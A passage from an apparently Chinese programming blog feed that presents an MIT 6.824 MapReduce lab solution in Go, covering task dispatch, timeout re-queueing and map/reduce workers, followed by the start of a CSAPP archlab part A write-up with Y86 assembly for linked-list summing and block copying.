class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>Coordinator</code>接受到<code>worker</code>的请求后，根据请求的消息类型进行回应，如果当前的任务已经完成，则直接回应；如果请求的消息为任务请求，则查看是否存在待处理的<code>map</code>任务，如果存在则分发一个<code>map</code>类型的任务，如果<code>map</code>任务都已经下发但是还未全部完成，则通知<code>worker</code>进行等待；如果所有的<code>map</code>任务都已经下发且已经完成，则分配一个<code>reduce</code>类型的任务交给<code>worker</code>进行处理；如果接受的消息为<code>worker</code>通知任务完成，我们会校验该任务的标识，如果校验通过，我们将相应的任务状态设置为已经完成。</li>
<li>最关键的一点处理，每当<code>Coordinator</code>分配一个任务后，就会启动一个定时器任务，该定时器任务会在<code>10s</code>后检查该任务的状态是否已经完成，如果未完成，则将该任务再次进入到待分配列表中。</li>
<li>关键的临界区处理，这点我处理的不太好，为了图简单，直接在所有的存在竞争的数据访问处都用的互斥锁锁，其实也可以试试用<code>go</code>的<code>atmoic</code>来定义某些关键数据类型，后面如果需要改进的话重点放在临界区访问的控制上。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c.lock.L.Lock()</span><br><span class="line">allDone := c.taskDone </span><br><span class="line">c.lock.L.Unlock()</span><br><span class="line"><span class="keyword">if</span> allDone &#123; <span class="comment">//检验当前所有任务的状态，如果已经全部完成则直接返回</span></span><br><span class="line">	reply.RepId = args.ReqId</span><br><span class="line">	reply.RepOp = TaskDone</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> args.ReqOp&#123;</span><br><span class="line">	<span class="keyword">case</span> TaskReq: <span class="comment">//任务请求</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(c.mapTasks) &gt; <span class="number">0</span> &#123; <span class="comment">//如果存在待分配的map任务，则分配一个任务给当前的worker</span></span><br><span class="line">			reply.RepId = args.ReqId</span><br><span class="line">			reply.RepOp = TaskMap</span><br><span class="line">			reply.RepTaskId = &lt;-c.mapTasks</span><br><span class="line">			reply.RepnMap = c.nMap</span><br><span class="line">			reply.RepContent = c.tasks[reply.RepTaskId]</span><br><span class="line">			reply.RepnReduce = c.nReduce</span><br><span class="line">			c.lock.L.Lock()</span><br><span class="line">			c.mapRuning[reply.RepTaskId] = args.ReqId <span class="comment">//记录当前任务请求的标识</span></span><br><span class="line">			c.lock.L.Unlock()</span><br><span class="line">			<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(taskId <span class="type">int</span>)</span></span>&#123; <span class="comment">// 10s后检查该任务是否完成，如果未完成则将该任务再次进入待分配列表</span></span><br><span class="line">				time.Sleep(<span class="number">10</span>*time.Second)</span><br><span class="line">				c.lock.L.Lock()</span><br><span class="line">				<span class="keyword">if</span> c.mapRuning[taskId] != <span class="number">1</span>&#123;</span><br><span class="line">					c.mapTasks&lt;-taskId</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					c.mapCnt--</span><br><span class="line">				&#125;</span><br><span class="line">				c.lock.L.Unlock()</span><br><span class="line">			&#125;(reply.RepTaskId)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">len</span>(c.mapTasks) == <span class="number">0</span> &#123;</span><br><span class="line">			c.lock.L.Lock()</span><br><span class="line">			mapCurr := c.mapCnt</span><br><span class="line">			reduceCurr := c.reduceCnt</span><br><span class="line">			c.lock.L.Unlock()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>  mapCurr &gt; <span class="number">0</span> &#123; <span class="comment">// map任务全部分配，但是并未全部完成，此时需要通知worker进行等待</span></span><br><span class="line">				reply.RepId = args.ReqId</span><br><span class="line">				reply.RepOp = TaskWait</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">len</span>(c.reduceTasks) &gt; <span class="number">0</span> &#123;<span class="comment">// 如果存在待分配的reduce任务，则分配一个任务给当前的worker</span></span><br><span class="line">					reply.RepId = args.ReqId</span><br><span class="line">					reply.RepOp = TaskReduce</span><br><span class="line">					reply.RepTaskId = &lt;-c.reduceTasks</span><br><span class="line">					reply.RepnMap = c.nMap</span><br><span class="line">					reply.RepnReduce = c.nReduce</span><br><span class="line">					c.lock.L.Lock()</span><br><span class="line">					c.reduceRuning[reply.RepTaskId] = args.ReqId</span><br><span class="line">					c.lock.L.Unlock()</span><br><span class="line">					<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(taskId <span class="type">int</span>)</span></span>&#123;</span><br><span class="line">						time.Sleep(<span class="number">10</span>*time.Second) <span class="comment">//  10s后检查该任务是否完成，如果未完成则将该任务再次进入待分配列表</span></span><br><span class="line">						c.lock.L.Lock()</span><br><span class="line">						<span class="keyword">if</span> c.reduceRuning[taskId] != <span class="number">1</span>&#123;</span><br><span class="line">							c.reduceTasks&lt;-taskId</span><br><span class="line">						&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">							c.reduceCnt--</span><br><span class="line">							<span class="keyword">if</span> c.reduceCnt == <span class="number">0</span>&#123;</span><br><span class="line">								c.taskDone = <span class="literal">true</span></span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						c.lock.L.Unlock()</span><br><span class="line">					&#125;(reply.RepTaskId)</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">if</span> reduceCurr &gt; <span class="number">0</span> &#123; <span class="comment">// reduce任务全部分配，但是并未全部完成，此时需要通知worker进行等待</span></span><br><span class="line">						reply.RepId = args.ReqId</span><br><span class="line">						reply.RepOp = TaskWait</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">case</span> TaskMapDone: <span class="comment">// map任务完成，将该任务的状态置为完成</span></span><br><span class="line">		c.lock.L.Lock()</span><br><span class="line">		<span class="keyword">if</span> c.mapRuning[args.ReqTaskId] == args.ReqId &#123;</span><br><span class="line">			c.mapRuning[args.ReqTaskId] = <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.lock.L.Unlock()</span><br><span class="line">	<span class="keyword">case</span> TaskReduceDone: <span class="comment">// reduce任务完成，将该任务的状态置为完成</span></span><br><span class="line">		c.lock.L.Lock()</span><br><span class="line">		<span class="keyword">if</span> c.reduceRuning[args.ReqTaskId] == args.ReqId&#123;</span><br><span class="line">			c.reduceRuning[args.ReqTaskId] = <span class="number">1</span></span><br><span class="line">		&#125;</span><br><span class="line">		c.lock.L.Unlock()</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Worker"><a href="#Worker" class="headerlink" title="Worker"></a>Worker</h3><p><code>worker</code>的处理就简单许多，主要是<code>map</code>处理和<code>reduce</code>处理，这个基本上可以参考<code>lab</code>给定的<code>mrsequential</code>代码即可，此时我们主要对<code>map</code>进行处理产生中间文件交给<code>reduce</code>处理即可。</p>
<ul>
<li><code>map</code>:从文件种读取所有的<code>key-value</code>数据，然后根据<code>hash</code>值写入不同的文件即可，当然这里的优化完全可以按照hash值进行排序，这样可以一次性将hash值相同的元素写入同一个文件，避免每次写入时写入不同的文件，从而可以加快处理速度。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// main/mrworker.go calls this function.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// process a map task</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startMapTask</span><span class="params">(timestamp <span class="type">int64</span>,reply * ReplyArgs,mapf <span class="keyword">func</span>(<span class="type">string</span>, <span class="type">string</span>)</span></span> []KeyValue) <span class="type">bool</span> &#123;</span><br><span class="line">	ifile, err := os.Open(reply.RepContent)</span><br><span class="line">	<span class="keyword">defer</span> ifile.Close()</span><br><span class="line">	<span class="comment">// read content from the file</span></span><br><span class="line">	content, err := ioutil.ReadAll(ifile)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;can not read %v&quot;</span>, reply.RepContent)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	intermediate := mapf(reply.RepContent, <span class="type">string</span>(content)) <span class="comment">// map任务处理</span></span><br><span class="line">	ofile := <span class="built_in">make</span>([]*os.File,reply.RepnReduce)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; reply.RepnReduce; i++ &#123;</span><br><span class="line">		ofname := <span class="string">&quot;mr-&quot;</span> + strconv.Itoa(reply.RepTaskId) + <span class="string">&quot;-&quot;</span> + strconv.Itoa(i)</span><br><span class="line">		ofile[i], _ = os.Create(ofname)</span><br><span class="line">		<span class="keyword">defer</span> ofile[i].Close()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> _,kv := <span class="keyword">range</span> intermediate&#123; <span class="comment">// 根据key的hash值写入相应的中间文件</span></span><br><span class="line">		reduceId := ihash(kv.Key)%reply.RepnReduce</span><br><span class="line">		enc := json.NewEncoder(ofile[reduceId])</span><br><span class="line">		err := enc.Encode(&amp;kv)</span><br><span class="line">		<span class="keyword">if</span>(err != <span class="literal">nil</span>)&#123;</span><br><span class="line">			log.Fatalf(<span class="string">&quot;can not read %v&quot;</span>, ofile[reduceId])</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//notice the server task finished</span></span><br><span class="line">	args := ReqArgs&#123;&#125; <span class="comment">// 向Coordinator回应本次任务处理完成</span></span><br><span class="line">	args.ReqId = timestamp</span><br><span class="line">	args.ReqOp = TaskMapDone</span><br><span class="line">	args.ReqTaskId = reply.RepTaskId</span><br><span class="line">	nextreply := ReplyArgs&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> call(<span class="string">&quot;Coordinator.Request&quot;</span>, &amp;args, &amp;nextreply)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><code>reduce</code>:从文件种读取所有的<code>key hash</code>值相同的数据，然后根据<code>key</code>进行排序，将相同的<code>key</code>的元素进行<code>reduce</code>处理，处理完成后结果写入到目标文件种，全部完成后通知<code>Coordinator</code>本次任务完成。<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">/ process a reduce task</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">startReduceTask</span><span class="params">(timestamp <span class="type">int64</span>,reply * ReplyArgs,reducef <span class="keyword">func</span>(<span class="type">string</span>, []<span class="type">string</span>)</span></span> <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="comment">// we check every intermediate map task file</span></span><br><span class="line">	kva := []KeyValue&#123;&#125; </span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; reply.RepnMap; i++ &#123; <span class="comment">//读取所有的中间文件</span></span><br><span class="line">		ifilename := <span class="string">&quot;mr-&quot;</span> + strconv.Itoa(i) + <span class="string">&quot;-&quot;</span> + strconv.Itoa(reply.RepTaskId)</span><br><span class="line">		ifile, err := os.Open(ifilename)</span><br><span class="line">		<span class="keyword">defer</span> ifile.Close()</span><br><span class="line">		<span class="comment">// open file error</span></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">			log.Fatalf(<span class="string">&quot;Open File Error.&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// read all intermediate data from the file</span></span><br><span class="line">		dec := json.NewDecoder(ifile)</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">var</span> kv KeyValue</span><br><span class="line">			<span class="keyword">if</span> err := dec.Decode(&amp;kv); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125; </span><br><span class="line">			kva = <span class="built_in">append</span>(kva, kv)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//store intermediate data to the out file</span></span><br><span class="line">	sort.Sort(ByKey(kva)) <span class="comment">//排序</span></span><br><span class="line">	<span class="comment">// write to the target file</span></span><br><span class="line">	ofilename := <span class="string">&quot;mr-out-&quot;</span> + strconv.Itoa(reply.RepTaskId)</span><br><span class="line">	<span class="comment">//fmt.Println(&quot;out file %v&quot;,ofilename)</span></span><br><span class="line">	ofile,err := os.Create(ofilename)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;Creat Open File Error.&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> ofile.Close()</span><br><span class="line">	i := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i &lt; <span class="built_in">len</span>(kva) &#123; <span class="comment">//按照相同的key进行分配，并进行reduce处理</span></span><br><span class="line">		j := i + <span class="number">1</span></span><br><span class="line">		<span class="keyword">for</span> j &lt; <span class="built_in">len</span>(kva) &amp;&amp; kva[j].Key == kva[i].Key &#123;</span><br><span class="line">			j++</span><br><span class="line">		&#125;</span><br><span class="line">		values := []<span class="type">string</span>&#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> k := i; k &lt; j; k++ &#123;</span><br><span class="line">			values = <span class="built_in">append</span>(values, kva[k].Value)</span><br><span class="line">		&#125;</span><br><span class="line">		output := reducef(kva[i].Key, values)</span><br><span class="line">		<span class="comment">// this is the correct format for each line of Reduce output.</span></span><br><span class="line">		fmt.Fprintf(ofile, <span class="string">&quot;%v %v\n&quot;</span>, kva[i].Key, output)</span><br><span class="line">		i = j</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//notice the server task finished</span></span><br><span class="line">	args := ReqArgs&#123;&#125; <span class="comment">// 向Coordinator回应本次任务处理完成</span></span><br><span class="line">	args.ReqId = timestamp</span><br><span class="line">	args.ReqOp = TaskReduceDone</span><br><span class="line">	args.ReqTaskId = reply.RepTaskId</span><br><span class="line">	nextreply := ReplyArgs&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> call(<span class="string">&quot;Coordinator.Request&quot;</span>, &amp;args, &amp;nextreply)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Map-Reduce"><a href="#Map-Reduce" class="headerlink" title="Map-Reduce"></a>Map-Reduce</h3><p>根据<code>paper</code>中的描述如下：<br><img src="https://i.loli.net/2021/03/16/GQntKroZga4NE6j.png"></p>
<ol>
<li>假设有 <code>M </code> 个 <code>map</code>   操作， <code>n</code> 个 <code>reduce</code>  操作， 那么<code>master</code>一共要安排<code>M +N</code> 个<code>worker</code>任务 。</li>
<li>每个 <code>map</code> 操作将生成  <code>n </code>个文件，<code>map </code>过程一共产生  <code>m*n</code> 个文件.</li>
<li><code>map</code> 操作完成后的数据是以文件的形式存储的.<br>实际处理过程：首先将 文档分成  <code>m </code>份，每一份调用一个 <code>map</code> 函数操作并生成 <code>n</code>个文件  。所有 <code>map </code>操作完成后进行 <code>reduce </code>操作，对于 每个 <code>reduce</code> 操作，从上一步生成 的<code>m*n</code> 个文件中选取对应的<code>m</code>个文件 进行<code>reduce</code> 操作，完成后将结果写入$n_{i}$ 中。 所有 <code>reduce</code> 操作完成后将 <code>n </code>个临时文件合并成最终的 <code>output</code> 文件<br><img src="https://i.loli.net/2021/03/16/W2GvcPOLAkXbtMH.png"></li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.824</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【CSAPP】 lab4</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/74/</url>
    <content><![CDATA[<h1 id="CSAPP-lab4-archlab"><a href="#CSAPP-lab4-archlab" class="headerlink" title="CSAPP lab4 archlab"></a>CSAPP lab4 archlab</h1><p><code>lab</code>真心难，这一章的体系结构部分还是真心很难，总共分为<code>parta、partb、partc</code>三部分，三部分都还挺难的，<code>parta,partb</code>部分还算比较容易,<code>partc</code>部分真心还是挺难的，需要仔细了解和学习相关知识。自我感觉学习还是非常有成效的，特别是之前做过《from nand to tetris》部分的课程还是有非常大的帮助，通过课程的学习对于体系结构和底层的汇编指令都有了一个初步的入门和学习。<br>首先需要了解一下<code>y86</code>的指令集如下:<br><img src="https://i.loli.net/2021/02/05/bVG6Wa9runO8DpR.png"><br><img src="https://i.loli.net/2021/02/05/3aZrcPGX2u7gM4Q.png"><br>基本上目前教材中已经给出的指令与指令详细的描述和指令字上如上图所示。</p>
<ul>
<li>有4个整数操作指令。对应表中的OPq，分别是addq, subq, andq, xorq。它们只对寄存器数据操作，同时还会设置条件码。</li>
<li>这里有7个跳转指令，就是图中的jXX。根据条件码来设置分支条件并进行跳转，分支条件和X86-64一样。</li>
<li>有6个条件传送指令，图示的cmovXX，这些指令格式和寄存器-寄存器传送指令一样，但是只有当条件码满足所需要的约束时，才会更新目的寄存器的值。</li>
<li>call指令和ret指令同X86-64一致，pushq和popq亦是如此</li>
<li>halt指令终止程序运行，并将状态码设置为HLT。<br>其中关于流水线的部分感觉过于晦涩，可以参考CSDN的中文翻译，质量很不错。<br><a href="https://blog.csdn.net/weixin_39997311/article/details/110458772">处理器体系结构</a></li>
</ul>
<h2 id="parta"><a href="#parta" class="headerlink" title="parta"></a>parta</h2><p>Write a Y86-64 program sum.ys that iteratively sums the elements of a linked list. Your program should<br>consist of some code that sets up the stack structure, invokes a function, and then halts. In this case,<br>the function should be Y86-64 code for a function (sum list) that is functionally equivalent to the C<br>sum list function in Figure 1. Test your program using the following three-element list:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* linked list element */</span><br><span class="line">2 typedef struct ELE &#123;</span><br><span class="line">3 long val;</span><br><span class="line">4 struct ELE *next;</span><br><span class="line">5 &#125; *list_ptr;</span><br><span class="line">6 7</span><br><span class="line">/* sum_list - Sum the elements of a linked list */</span><br><span class="line">8 long sum_list(list_ptr ls)</span><br><span class="line">9 &#123;</span><br><span class="line">10 long val = 0;</span><br><span class="line">11 while (ls) &#123;</span><br><span class="line">12 val += ls-&gt;val;</span><br><span class="line">13 ls = ls-&gt;next;</span><br><span class="line">14 &#125;</span><br><span class="line">15 return val;</span><br><span class="line">16 &#125;</span><br><span class="line">17</span><br><span class="line">18 /* rsum_list - Recursive version of sum_list */</span><br><span class="line">19 long rsum_list(list_ptr ls)</span><br><span class="line">20 &#123;</span><br><span class="line">21 if (!ls)</span><br><span class="line">22 return 0;</span><br><span class="line">23 else &#123;</span><br><span class="line">24 long val = ls-&gt;val;</span><br><span class="line">25 long rest = rsum_list(ls-&gt;next);</span><br><span class="line">26 return val + rest;</span><br><span class="line">27 &#125;</span><br><span class="line">28 &#125;</span><br><span class="line">29</span><br><span class="line">30 /* copy_block - Copy src to dest and return xor checksum of src */</span><br><span class="line">31 long copy_block(long *src, long *dest, long len)</span><br><span class="line">32 &#123;</span><br><span class="line">33 long result = 0;</span><br><span class="line">34 while (len &gt; 0) &#123;</span><br><span class="line">35 long val = *src++;</span><br><span class="line">36 *dest++ = val;</span><br><span class="line">37 result ˆ= val;</span><br><span class="line">38 len--;</span><br><span class="line">39 &#125;</span><br><span class="line">40 return result;</span><br><span class="line">41 &#125;</span><br></pre></td></tr></table></figure>
<p>针对上述的三个函数<code>sum_list</code>,<code>rsum_list</code>,<code>copy_block</code>这三个函数用<code>y86</code>的汇编实现出来，并完成通过测试用例。</p>
<ul>
<li><code>sum_list</code>: 这个函数实现起来非常简单，我们直接用常规的几个指令即可完成，无非是有一个<code>loop</code>和判断条件。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* $begin code-yso */</span></span><br><span class="line"><span class="comment">/* $begin code-ysa */</span></span><br><span class="line"># Execution begins at address <span class="number">0</span> </span><br><span class="line">	.pos <span class="number">0</span> </span><br><span class="line">init:	irmovl Stack, %esp  	# Set up <span class="built_in">stack</span> pointer  </span><br><span class="line">	irmovl Stack, %ebp  	# Set up base pointer   </span><br><span class="line">	call Main		# Execute main program</span><br><span class="line">	halt			# Terminate program </span><br><span class="line"></span><br><span class="line"># Sample linked <span class="built_in">list</span></span><br><span class="line">    .align <span class="number">4</span></span><br><span class="line">ele1:   </span><br><span class="line">    .<span class="type">long</span> <span class="number">0x00a</span></span><br><span class="line">    .<span class="type">long</span> ele2</span><br><span class="line">ele2:   </span><br><span class="line">    .<span class="type">long</span> <span class="number">0x0b0</span></span><br><span class="line">    .<span class="type">long</span> ele3</span><br><span class="line">ele3:   </span><br><span class="line">    .<span class="type">long</span> <span class="number">0xc00</span></span><br><span class="line">    .<span class="type">long</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Main:	pushl %ebp </span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">	irmovl ele1,%edx</span><br><span class="line">	pushl %edx      # Push linklist head</span><br><span class="line">	call sum_list	# Sum(<span class="built_in">array</span>, <span class="number">4</span>)</span><br><span class="line">	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">	ret </span><br><span class="line"></span><br><span class="line">sum_list:   pushl %ebp</span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">    mrmovl <span class="number">8</span>(%ebp),%ebx 	<span class="meta"># eax = header, move list header to the register;</span></span><br><span class="line">    irmovl $<span class="number">0</span>,%eax            <span class="meta"># sum = 0;</span></span><br><span class="line">    irmovl <span class="number">4</span>,%ecx</span><br><span class="line">Loop:   mrmovl (%ebx),%esi	<span class="meta"># get val</span></span><br><span class="line">    addl %esi,%eax</span><br><span class="line">	addl %ecx,%ebx          <span class="meta"># list = list-&gt;next;</span></span><br><span class="line">    mrmovl (%ebx),%edx</span><br><span class="line">    rrmovl %edx,%ebx</span><br><span class="line">    andl   %ebx,%ebx</span><br><span class="line">    jne Loop</span><br><span class="line">End:	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">    ret</span><br><span class="line">    .pos <span class="number">0x200</span></span><br><span class="line">Stack:	# The <span class="built_in">stack</span> goes here</span><br></pre></td></tr></table></figure>
运行结果如下：<br><img src="https://i.loli.net/2021/02/05/hmSgNG5c9UrzIOl.png"></li>
<li><code>rsum_list</code>: 这个链表遍历是用递归实现的，因此稍微复杂一些，因为用到递归则寄存器<code>esi</code>存在重入的风险，因此此时我们则需要降每次取出的<code>val</code>压入到栈中，待到当前的函数调用结束后，再降其从栈中弹出上一次计算的值，与函数返回的值进行相加即可得到本次函数返回值。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* $begin code-yso */</span></span><br><span class="line"><span class="comment">/* $begin code-ysa */</span></span><br><span class="line"># Execution begins at address <span class="number">0</span> </span><br><span class="line">	.pos <span class="number">0</span> </span><br><span class="line">init:	irmovl Stack, %esp  	# Set up <span class="built_in">stack</span> pointer  </span><br><span class="line">	irmovl Stack, %ebp  	# Set up base pointer   </span><br><span class="line">	call Main		# Execute main program</span><br><span class="line">	halt			# Terminate program </span><br><span class="line"></span><br><span class="line"># Sample linked <span class="built_in">list</span></span><br><span class="line">.align <span class="number">4</span></span><br><span class="line">ele1:</span><br><span class="line">    .<span class="type">long</span> <span class="number">0x00a</span></span><br><span class="line">    .<span class="type">long</span> ele2</span><br><span class="line">ele2:</span><br><span class="line">    .<span class="type">long</span> <span class="number">0x0b0</span></span><br><span class="line">    .<span class="type">long</span> ele3</span><br><span class="line">ele3:</span><br><span class="line">    .<span class="type">long</span> <span class="number">0xc00</span></span><br><span class="line">    .<span class="type">long</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Main:	pushl %ebp </span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">	irmovl ele1,%edx</span><br><span class="line">	pushl %edx      # Push linklist head</span><br><span class="line">	call rsum_list	# Sum(<span class="built_in">array</span>, <span class="number">4</span>)</span><br><span class="line">	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">	ret </span><br><span class="line"></span><br><span class="line">rsum_list:   pushl %ebp</span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">    mrmovl <span class="number">8</span>(%ebp),%ebx 	<span class="meta"># ebx = header, move list header to the register;</span></span><br><span class="line">    xorl   %eax,%eax        <span class="meta"># eax = 0 </span></span><br><span class="line">    andl   %ebx,%ebx        <span class="meta"># ebx = 0 </span></span><br><span class="line">    je End</span><br><span class="line">    pushl  %esi             <span class="meta"># esi = val</span></span><br><span class="line">    mrmovl (%ebx),%esi	<span class="meta"># get val</span></span><br><span class="line">    mrmovl <span class="number">4</span>(%ebx),%edx	<span class="meta"># get val    </span></span><br><span class="line">    pushl  %edx</span><br><span class="line">    call   rsum_list</span><br><span class="line">    popl   %edx     </span><br><span class="line">    addl   %esi,%eax</span><br><span class="line">    popl   %esi</span><br><span class="line">End:	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">    ret</span><br><span class="line">    .pos <span class="number">0x200</span></span><br><span class="line">Stack:	# The <span class="built_in">stack</span> goes here</span><br><span class="line"></span><br></pre></td></tr></table></figure>
运行结果如下:<br><img src="https://i.loli.net/2021/02/05/TjNknOHeFzC7pYb.png"></li>
<li><code>copy_block</code>: 这个就更简单了，就是基本的拷贝和复制，用好几种寻址方式即可。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/* $begin code-yso */</span><br><span class="line">/* $begin code-ysa */</span><br><span class="line"><span class="comment"># Execution begins at address 0 </span></span><br><span class="line">	.pos <span class="number">0</span> </span><br><span class="line">init:	irmovl Stack, %esp  	<span class="comment"># Set up stack pointer  </span></span><br><span class="line">	irmovl Stack, %ebp  	<span class="comment"># Set up base pointer   </span></span><br><span class="line">	call Main		<span class="comment"># Execute main program</span></span><br><span class="line">	halt			<span class="comment"># Terminate program </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Source block</span></span><br><span class="line">.align <span class="number">4</span></span><br><span class="line">src:</span><br><span class="line">    .long <span class="number">0x00a</span></span><br><span class="line">    .long <span class="number">0x0b0</span></span><br><span class="line">    .long <span class="number">0xc00</span></span><br><span class="line"><span class="comment"># Destination block</span></span><br><span class="line">dest:</span><br><span class="line">    .long <span class="number">0x111</span></span><br><span class="line">    .long <span class="number">0x222</span></span><br><span class="line">    .long <span class="number">0x333</span></span><br><span class="line"></span><br><span class="line">Main:	pushl %ebp </span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">    irmovl $<span class="number">3</span>,%edx</span><br><span class="line">	pushl %edx      <span class="comment"># Push linklist head</span></span><br><span class="line">    irmovl dest,%edx</span><br><span class="line">    pushl %edx</span><br><span class="line">    irmovl src,%edx</span><br><span class="line">    pushl %edx</span><br><span class="line">	call copy_block	<span class="comment"># Sum(array, 4)</span></span><br><span class="line">	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">	ret </span><br><span class="line"></span><br><span class="line">copy_block:   pushl %ebp</span><br><span class="line">	rrmovl %esp,%ebp</span><br><span class="line">    mrmovl <span class="number">8</span>(%ebp),%ebx 	<span class="comment"># ebx = src ;</span></span><br><span class="line">    mrmovl <span class="number">12</span>(%ebp),%ecx 	<span class="comment"># ecx = dst ;</span></span><br><span class="line">    mrmovl <span class="number">16</span>(%ebp),%edx 	<span class="comment"># edx = len;</span></span><br><span class="line">    xorl   %eax,%eax</span><br><span class="line">    andl   %edx,%edx</span><br><span class="line">    jle  End</span><br><span class="line">Loop:    mrmovl (%ebx),%esi	<span class="comment"># get src</span></span><br><span class="line">    rmmovl %esi,(%ecx)  <span class="comment"># dst = src</span></span><br><span class="line">    xorl   %esi,%eax    <span class="comment"># result = result^vald</span></span><br><span class="line">    irmovl $<span class="number">4</span>,%esi</span><br><span class="line">    addl   %esi,%ebx    <span class="comment"># dst++</span></span><br><span class="line">    addl   %esi,%ecx    <span class="comment"># src++</span></span><br><span class="line">    irmovl $-<span class="number">1</span>,%esi	    </span><br><span class="line">    addl   %esi,%edx    <span class="comment"># len--</span></span><br><span class="line">    jg Loop</span><br><span class="line">End:	rrmovl %ebp,%esp</span><br><span class="line">	popl %ebp</span><br><span class="line">    ret</span><br><span class="line">    .pos <span class="number">0x200</span></span><br><span class="line">Stack:	<span class="comment"># The stack goes here</span></span><br></pre></td></tr></table></figure>
运行结果如下：<br><img src="https://i.loli.net/2021/02/05/HhVydEMFLgYsBvG.png"></li>
</ul>
